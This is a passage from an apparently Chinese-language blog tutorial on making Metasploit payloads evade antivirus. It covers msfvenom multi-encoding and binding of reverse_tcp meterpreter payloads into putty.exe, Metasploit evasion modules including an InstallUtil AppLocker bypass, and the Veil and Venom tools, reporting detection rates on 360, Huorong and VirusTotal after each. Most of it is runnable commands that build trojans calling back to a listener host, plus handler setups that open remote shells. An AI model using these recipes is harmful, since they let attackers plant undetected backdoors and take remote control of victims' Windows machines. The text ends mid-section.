<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261932310.png" alt="image-20220526193243216"></p>
<h3 id="msf自捆绑-编码-VT查杀率16-69"><a href="#msf自捆绑-编码-VT查杀率16-69" class="headerlink" title="msf自捆绑+编码(VT查杀率16&#x2F;69)"></a>msf自捆绑+编码(VT查杀率16&#x2F;69)</h3><p>将上面的编码和捆绑两种方法结合一下进行尝试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o /mnt/hgfs/Share/payload4.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261933974.png" alt="image-20220526193359812"></p>
<p>与上一种方法对比，大小完全一样。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261935858.png" alt="image-20220526193552798"></p>
<p>可修改-i编码次数，编码次数越多，生成的payload越可能免杀，经测试，编码5次和6次可免杀360。</p>
<p>360能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒动态静态均能查杀，而360不会报毒）。</p>
<p>在virustotal.com上查杀率为16&#x2F;69（原po为35&#x2F;69）。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261940527.png" alt="image-20220526194032466"></p>
<p>VT：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261938216.png" alt="image-20220526193813109"></p>
<h3 id="msfvenom多重编码-VT查杀率28-67"><a href="#msfvenom多重编码-VT查杀率28-67" class="headerlink" title="msfvenom多重编码(VT查杀率28&#x2F;67)"></a>msfvenom多重编码(VT查杀率28&#x2F;67)</h3><p>msfvenom的encoder编码器可以对payload进行一定程度免杀，同时还可以使用msfvenom多重编码功能，通过管道，让msfvenom用不同编码器反复编码进行混淆。</p>
<p>如下命令，使用管道让<code>msfvenom</code>对攻击载荷多重编码，先用<code>shikata_ga_nai</code>编码20次，接着来10次的<code>alpha_upper</code>编码，再来10次的<code>countdown</code>编码，最后才生成以<code>putty.exe</code>为模板的可执行文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=192.168.174.128 LPORT=6666 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o /mnt/hgfs/Share/payload5.exe</span><br></pre></td></tr></table></figure>

<p>如果报错<code>Error: You must select an arch for a custom payload</code>，则添加参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-a x86 --platform windows</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261949206.png" alt="image-20220526194938055"></p>
<p>还有更多重编码姿势：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 14 LHOST=192.168.74.133 LPORT=5110 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 13 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -b &quot;&amp;&quot; -i 4 -f raw | msfvenom -a x86 --platform windows -e cmd/powershell_base64 -i 10 -x putty.exe -k -f exe &gt; payload6.exe</span><br></pre></td></tr></table></figure>

<p>经过测试，发现使用的编码类型越多，免杀率可能会降低，猜测是因为各种编码引入了更多的特征码。同时生成的payload也很可能无法正常执行，这个也和被捆绑程序有一定关联。</p>
<p>360可以查杀，火绒不能查杀。</p>
<p>在virustotal.com上查杀率为28&#x2F;67（原po为45&#x2F;70），Bypass了McAfee。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261951182.png" alt="image-20220526195103114"></p>
<p>VT：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261956521.png" alt="image-20220526195652390"></p>
<h2 id="Metasploit-Evasion免杀"><a href="#Metasploit-Evasion免杀" class="headerlink" title="Metasploit Evasion免杀"></a>Metasploit Evasion免杀</h2><p>2019年1月，metasploit升级到了5.0，引入了一个新的模块叫Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马。evasion有以下几个模块,可以使用<code>show evasion</code>进行查看。</p>
<p>msf6 evasion模块：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270847820.png" alt="image-20220527084747663"></p>
<h3 id="生成exe-VT查杀率43-69"><a href="#生成exe-VT查杀率43-69" class="headerlink" title="生成exe(VT查杀率43&#x2F;69)"></a>生成exe(VT查杀率43&#x2F;69)</h3><p>使用<code>use windows/windows_defender_exe</code>进行生成payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use windows/windows_defender_exe</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set filename payload.exe</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set LHOST 192.168.174.128</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set LPORT 6666</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270855472.png" alt="image-20220527085549361"></p>
<p>不打开杀软的情况下，可正常上线：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler -H 192.168.174.128 -P 6666 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<p>打开杀软，360和火绒都能查杀。</p>
<p>在virustotal.com上查杀率为43&#x2F;69（原po为42&#x2F;71）。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270858477.png" alt="image-20220527085842405"></p>
<p>火绒：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270857265.png" alt="image-20220527085747182"></p>
<p>VT：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270900839.png" alt="image-20220527090002712"></p>
<h3 id="生成hta-VT查杀率14-59"><a href="#生成hta-VT查杀率14-59" class="headerlink" title="生成hta(VT查杀率14&#x2F;59)"></a>生成hta(VT查杀率14&#x2F;59)</h3><p>用另外一个evasion模块<code>windows/windows_defender_js_hta</code>生成一下，360同样被杀。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use windows/windows_defender_js_hta</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set filename payload1.exe</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set LHOST 192.168.174.128</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set LPORT 6666</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; run</span><br></pre></td></tr></table></figure>

<p>但是火绒静态+行为查杀都没发现问题，可正常上线。</p>
<p>在virustotal.com上查杀率为14&#x2F;59。不过在线查毒时显示360也没查出来，但本地测试时却是能查出来的，所以在线查杀还是不太精准的。</p>
<p>复现时该模块生成的可执行无法运行。</p>
<h3 id="生成install-util-VT查杀率33-69"><a href="#生成install-util-VT查杀率33-69" class="headerlink" title="生成install_util(VT查杀率33&#x2F;69)"></a>生成install_util(VT查杀率33&#x2F;69)</h3><p>evasion还提供了其他几个模块，比如<code>windows/applocker_evasion_install_util</code></p>
<p>创建payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use windows/applocker_evasion_install_util</span><br><span class="line">msf6 evasion(windows/applocker_evasion_install_util) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 evasion(windows/applocker_evasion_install_util) &gt; set lhost 192.168.174.128</span><br><span class="line">msf6 evasion(windows/applocker_evasion_install_util) &gt; set lport 6666</span><br><span class="line">msf6 evasion(windows/applocker_evasion_install_util) &gt; run</span><br><span class="line"></span><br><span class="line">[+] install_util.txt stored at /Users/xysoul/.msf4/local/install_util.txt</span><br><span class="line">[*] Copy install_util.txt to the target</span><br><span class="line">[*] Compile using: C:\Windows\Microsoft.Net\Framework\[.NET Version]\csc.exe /out:install_util.exe install_util.txt</span><br><span class="line">[*] Execute using: C:\Windows\Microsoft.Net\Framework\[.NET Version]\InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</span><br></pre></td></tr></table></figure>

<p>根据说明，需要使用csc.exe进行编译一下，然后用<code>InstallUtil.exe</code>加载文件。</p>
<p>csc.exe是微软.NET Framework 中的C#语言编译器，本机安装了.net后就可以找到该文件。用vs2017里的csc.exe进行编译，生成install_util.exe。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.Net\Framework\v2.0.50727\csc.exe /out:install_util.exe install_util.txt</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270927923.png" alt="image-20220527092742869"></p>
<p>直接执行<code>install_util.exe</code>，无法上线，并且360查杀报毒。</p>
<p>根据说明，需要使用<code>InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</code>来加载，才能成功上线。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.Net\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</span><br></pre></td></tr></table></figure>

<p>注意的是，如果生成的是32位的payload，就要用32位的.net下的InstallUtil来加载，否则文件会无法执行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270931141.png" alt="image-20220527093115067"></p>
<p>360和火绒都能查杀（原po静态查杀都没有问题，执行时360行为查杀会报毒）。</p>
<p>在virustotal.com上查杀率为33&#x2F;69（原po为12&#x2F;71）。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270932856.png" alt="image-20220527093207774"></p>
<p>火绒：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270935961.png" alt="image-20220527093508879"></p>
<p>VT：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270936872.png" alt="image-20220527093615742"></p>
<h2 id="Veil免杀"><a href="#Veil免杀" class="headerlink" title="Veil免杀"></a>Veil免杀</h2><p>Veil、Venom和Shellter是三大老牌免杀工具。</p>
<p>Veil-Evasion是一个用python写的免杀框架，可以将任意脚本或一段shellcode转换成Windows可执行文件，还能利用Metasploit框架生成相兼容的Payload工具，从而逃避了常见防病毒产品的检测。</p>
<h3 id="安装Veil"><a href="#安装Veil" class="headerlink" title="安装Veil"></a>安装Veil</h3><p>推荐Docker方式进行安装。镜像地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hub.docker.com/r/mattiasohlsson/veil/</span><br></pre></td></tr></table></figure>

<p>拉取veil镜像：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mattiasohlsson/veil</span><br></pre></td></tr></table></figure>

<p>拉取成功后，执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil</span><br></pre></td></tr></table></figure>

<p><code>-v /tmp/veil-output:/var/lib/veil/output:Z</code>是将宿主机的<code>/tmp/veil-output</code>目录映射到docker里面，这样veil生成的payload可以直接在宿主机里使用。</p>
<p>之后再进入镜像可以在启动镜像后使用下面命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it &lt;container id&gt; /bin/bash</span><br></pre></td></tr></table></figure>

<p>执行<code>veil</code>命令可启动,版本为3.1.1。</p>
<p>veil有两个免杀的工具，Evasion和Ordnance。Ordnance可生成在Veil-Evasion中使用的shellcode，Evasion是用做文件免杀。一般选择Evasion。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Veil&gt;: use 1                   #选择Evasion功能</span><br><span class="line">Veil/Evasion&gt;: list            #查看payload列表</span><br></pre></td></tr></table></figure>

<p>使用<code>list</code>可以看到到41种stager。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270946813.png" alt="image-20220527094613602"></p>
<p>推荐使用以go和ruby语言encode的编码方式。像python这类的与用户有较高的交互就容易被查杀。</p>
<p>veil原理可以参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4191">https://xz.aliyun.com/t/4191</a></p>
<h3 id="使用veil直接生成exe-VT查杀率44-69"><a href="#使用veil直接生成exe-VT查杀率44-69" class="headerlink" title="使用veil直接生成exe(VT查杀率44&#x2F;69)"></a>使用veil直接生成exe(VT查杀率44&#x2F;69)</h3><p>veil可以直接生成支持msf的payload，我们先试一下看看效果。</p>
<p>使用go语言生成msf的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Veil/Evasion&gt;: use 16</span><br></pre></td></tr></table></figure>

<p>设置好msf的监听主机和端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[go/meterpreter/rev_tcp&gt;&gt;]: set lhost 192.168.174.128</span><br><span class="line">[go/meterpreter/rev_tcp&gt;&gt;]: set lport 6666</span><br><span class="line">[go/meterpreter/rev_tcp&gt;&gt;]: generate</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270959676.png" alt="image-20220527095925448"></p>
<p>设定好生成的payload的名称，例如payload1：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270950182.png" alt="image-20220527094916300"></p>
<p>一系列编码编译之后，就生成payload了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205270950223.png" alt="image-20220527095021088"></p>
<p>因为之前已经做过Docker目录映射，所以在宿主机的<code>/tmp/veil-output/compiled/</code>目录可直接看到生成的exe文件。</p>
<p>在msf中监听：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.174.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>

<p>在测试主机执行<code>payload1.exe</code>，360和火绒均可以查杀（原po在msf中可上线，360和火绒均不报毒）。</p>
<p>在virustotal.com上查杀率为44&#x2F;69（原po为44&#x2F;71）。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271002159.png" alt="image-20220527100249086"></p>
<p>火绒：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271011302.png" alt="image-20220527101107223"></p>
<p>VT：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271013133.png" alt="image-20220527101335024"></p>
<h3 id="使用veil-mingw-w64-VT查杀率11-69"><a href="#使用veil-mingw-w64-VT查杀率11-69" class="headerlink" title="使用veil+mingw-w64(VT查杀率11&#x2F;69)"></a>使用veil+mingw-w64(VT查杀率11&#x2F;69)</h3><p>先用veil生成shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># veil</span><br><span class="line">Veil&gt; use 1								# 选择使用 Veil-Evasion 模块</span><br><span class="line">Veil/Evasion&gt; use 7						# 选择payload  c/meterpreter/rev_tcp.py</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.174.128</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] set LPORT 6666</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] generate</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271016580.png" alt="image-20220527101615402"></p>
<p>输入生成文件名为<code>c_msf</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271016611.png" alt="image-20220527101633513"></p>
<p>先生成一个可以被 msf 利用的 <code>c_msf.c</code> 然后用mingw-w64 来编译。</p>
<p>mingw-w64的安装可参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/76613134">https://zhuanlan.zhihu.com/p/76613134</a></p>
<p>若编译报错，可以尝试指定库，生成可执行文件a.exe：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc c_msf.c -lws2_32</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271121046.png" alt="image-20220527112104971"></p>
<p>360和火绒均可以查杀（原po全程开启360卫士和杀毒以及火绒，编译、运行、上线都没有问题）。</p>
<p>在virustotal.com上查杀率为11&#x2F;69（原po为23&#x2F;71）。Bypass了McAfee。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271124553.png" alt="image-20220527112426483"></p>
<p>火绒：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271122178.png" alt="image-20220527112257096"></p>
<p>VT：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271126466.png" alt="image-20220527112633347"></p>
<h2 id="Venom免杀"><a href="#Venom免杀" class="headerlink" title="Venom免杀"></a>Venom免杀</h2><p>Venom利用msfvenom（metasploit）生成不同的格式的shellcode，如（c | python | ruby | dll | msi | hta-psh）等，然后将生成的shellcode注入一个模板（例如：python），并使用类似gcc、mingw32或pyinstaller之类的编译器生成可执行文件。</p>
<p>Venom的一些功能还会直接调用<code>Veil-Evasion.py</code>，<code>unicorn.py</code>，<code>powersploit.py</code>等来直接创建免杀程序，避免重复造轮子。</p>
<h3 id="安装Venom"><a href="#安装Venom" class="headerlink" title="安装Venom"></a>安装Venom</h3><p>venom安装和运行必须是在图形界面下，如果是ssh终端连接到kali进行连接是不行的。venom依赖的软件比较多，所以安装出现问题是很正常的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Zenity | Metasploit | GCC (compiler) | Pyinstaller (compiler)</span><br><span class="line">mingw32 (compiler) | pyherion.py (crypter) | wine (emulator)</span><br><span class="line">PEScrambler.exe (PE obfuscator) | apache2 (webserver)| winrar (wine)</span><br><span class="line">vbs-obfuscator (obfuscator) | avet (Daniel Sauder) | shellter (KyRecon)</span><br><span class="line">ettercap (MitM + DNS_Spoofing) | encrypt_PolarSSL (AES crypter)</span><br></pre></td></tr></table></figure>

<p>从github上拖到本地</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/r00t-3xp10it/venom.git</span><br></pre></td></tr></table></figure>

<p>修改文件执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd venom</span><br><span class="line">sudo chmod -R +x *.sh</span><br><span class="line">sudo chmod -R +x *.py</span><br></pre></td></tr></table></figure>

<p>安装依赖库和软件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd aux</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure>

<p>运行venom，代码高亮有些问题，但是问题不大，还是可以用的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./venom.sh</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271736471.png" alt="image-20220527173623380"></p>
<h3 id="venom生成exe-VT查杀率35-68"><a href="#venom生成exe-VT查杀率35-68" class="headerlink" title="venom生成exe(VT查杀率35&#x2F;68)"></a>venom生成exe(VT查杀率35&#x2F;68)</h3><p>启动venom:<code>sudo ./venom.sh</code>，然后选择windows，也就是2，然后会列出所有windows可用的20个agent。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271737599.png" alt="image-20220527173757520"></p>
<p>支持的种类还是比较全面的，shellter、avet等免杀工具都内置在里面了，而且支持很多种类似的payload格式。</p>
<p>先生成一个最简单直接的，第4个模块，通过C编译EXE程序。</p>
<p>在输入4之后，会弹出一个框让你输入ip地址，这个就是你msf监听主机的地址：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271739076.png" alt="image-20220527173929002"></p>
<p>然后输入端口号之后，选择payload，选择最常规的<code>windows/meterperter/reverse_tcp</code>。</p>
<p>输入一个文件名，例如notepad。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271740284.png" alt="image-20220527174056207"></p>
<p>然后在编译和生成exe的过程中，会弹出来两个选项框，一般默认就行。</p>
<p>之后会提示已经生成，并询问你如何分发payload，直接在测试机上执行就行了，可见output文件夹已经生成了notepad.exe。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271742310.png" alt="image-20220527174259258"></p>
<p>360和火绒均可以查杀（原po360静态检测没问题，但行为检测能查杀出为病毒；火绒则静态+动态都没有检测到）。</p>
<p>在virustotal.com上查杀率为35&#x2F;68（原po为19&#x2F;71）。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271800602.png" alt="image-20220527180055539"></p>
<p>火绒：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271801624.png" alt="image-20220527180138530"></p>
<p>VT：</p>
